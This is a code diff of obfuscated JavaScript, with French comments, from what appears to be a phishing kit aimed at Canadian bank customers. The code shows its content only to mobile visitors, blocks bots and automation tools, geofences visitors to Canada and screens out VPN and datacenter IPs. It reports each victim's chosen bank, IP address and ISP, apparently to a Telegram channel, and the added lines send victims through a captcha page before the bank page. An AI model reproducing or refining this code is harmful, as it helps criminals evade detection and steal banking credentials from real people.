@@ -30,20 +30,18 @@
     }
   }
 
-  // 1. Détection Mobile (Assouplie pour éviter les faux positifs)
+  // 1. Détection Mobile
   function _isMobile(){
     var _ua = _N.userAgent || '';
     var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(_ua);
     var _touch = _N.maxTouchPoints > 0 || ('ontouchstart' in _W) || ('DocumentTouch' in _W);
-    
-    // Si c'est un User Agent mobile ou s'il a le touch et petit écran, on accepte
     if (_isMobUA || (_touch && Math.min(_W.screen.width, _W.screen.height) <= 1024)) {
       return true;
     }
     return false;
   }
 
-  // 2. Détection Bot (Stricte)
+  // 2. Détection Bot
   function _isBot(){
     if (_N.webdriver === true || _D.documentElement.getAttribute('webdriver')) return true;
     if (_W.callPhantom || _W._phantom || _W.__nightmare || _W.domAutomation || _W.domAutomationController) return true;
@@ -167,18 +165,25 @@
         var _finalBankName = _matchedBank ? _matchedBank : (_clean || 'Banque inconnue');
 
         _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+
+        // Interception pour passer par le Captcha avant la banque
+        var _href = _el.getAttribute('href');
+        if (_href && _href !== '#' && _href.indexOf('captcha.html') === -1) {
+          e.preventDefault();
+          e.stopPropagation();
+          _W.sessionStorage.setItem('__targetBank', _href);
+          _W.location.href = 'captcha.html';
+        }
       }, true);
     });
   }
 
   function _init(){
-    // 1. Mobile-only check
     if (!_isMobile()) {
       _die();
       return;
     }
 
-    // 2. Bot check
     if (_isBot()) {
       _die();
       return;
@@ -194,7 +199,6 @@
       _setupBanks();
     }
 
-    // IP Check via Cloudflare trace
     fetch('https://www.cloudflare.com/cdn-cgi/trace')
       .then(function(r){ return r.text(); })
       .then(function(t){
@@ -203,21 +207,16 @@
         var loc = locMatch ? locMatch[1] : '';
         var ipVal = ipMatch ? ipMatch[1] : '';
 
-        // Bloquer uniquement si le pays n'est pas CA
         if (loc !== _CC) {
           _die();
           return;
         }
 
-        // Tenter de filtrer les gros datacenters/VPNs connus sans bloquer les abonnements résidentiels
         fetch('https://ipwho.is/' + ipVal)
           .then(function(r){ return r.json(); })
           .then(function(d){
             if (d.success) {
               var _sec = d.security || {};
-              var _conn = d.connection || {};
-              
-              // On bloque proxy/vpn stricts et les vrais datacenters (pas les ASN résidentiels)
               var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
               var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
               var strictVpnPatterns = /expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton|m247|hetzner|linode|digitalocean|ovh/i;
